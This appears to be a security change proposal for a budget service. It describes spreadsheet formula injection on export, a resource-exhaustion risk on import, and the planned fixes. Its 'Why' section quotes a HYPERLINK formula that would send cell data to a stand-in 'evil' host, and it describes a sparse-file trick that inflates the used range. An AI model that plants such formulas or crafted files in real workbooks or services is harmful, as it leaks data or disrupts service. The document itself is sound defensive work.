## Why

We verified two problems in the budget service's spreadsheet handling:

1. **Formula injection on export.** openpyxl stores any string that starts with `=` as a formula (`cell.data_type == "f"`; confirmed on openpyxl 3.1.5). `excel_export_service.py` writes user-controlled strings straight into cells on all three sheets: line descriptions, category names, `extra_fields` keys and values, expense descriptions, organisation, donor and project names, and the audit footer. A description like `=HYPERLINK("https://evil/?"&B3,"click")` becomes a live formula in a workbook that donors and other organisations open.
2. **Resource exhaustion on import.** `ExcelStructureDetector` loads the whole workbook twice with openpyxl in normal (non-read-only) mode and then visits every cell in the used range. A tiny sparse file with cells at `A1` and `XFD1048576` has a used range of about 17.2 billion cells, and in normal mode every visited cell is created in memory. The only limit is 10 MB *compressed*. Parsing runs synchronously inside an `async` handler, so it also blocks the budget service's event loop for every other request. `defusedxml` isn't installed, so openpyxl's XML hardening is off.

## What Changes

- Export writes every value that isn't generated by the application as a plain text cell, on every sheet. Formulas generated by the application (subtotals, conversions, cross-sheet actuals) stay formulas.
- Import checks the uploaded archive before opening it with openpyxl:
  - caps on total uncompressed size, per-member size, compression ratio and member count
  - a streaming scan of each worksheet's cell references that aborts when rows, columns or populated cells exceed the caps, without building the used range
- Workbook parsing runs in a worker thread behind a small per-process concurrency limit, so it never blocks the event loop.
- Add `defusedxml` so openpyxl uses its hardened XML parser.
- Oversized or malformed files are rejected with a clear 400 message and are not stored.

## Capabilities

### New Capabilities
(none)

### Modified Capabilities
- `budget-excel-export`: user-supplied text is never written as a formula. This capability is currently being introduced by the in-flight `budget-feat-313-excel-export` change, so this change must be archived after it.
- `budget-excel-import`: `prepare-import` bounds decompression and worksheet size before parsing, and parses off the event loop.

## Impact

- `services/budget/app/services/excel_export_service.py`
- `services/budget/app/services/excel_import_service.py`, `app/services/template_detection/spreadsheet_reader.py`, and a new `app/services/template_detection/workbook_limits.py`
- `services/budget/requirements.txt` (`defusedxml`)
- Legitimate budgets that exceed the new caps would be rejected. The caps are set well above real donor templates (see design.md).
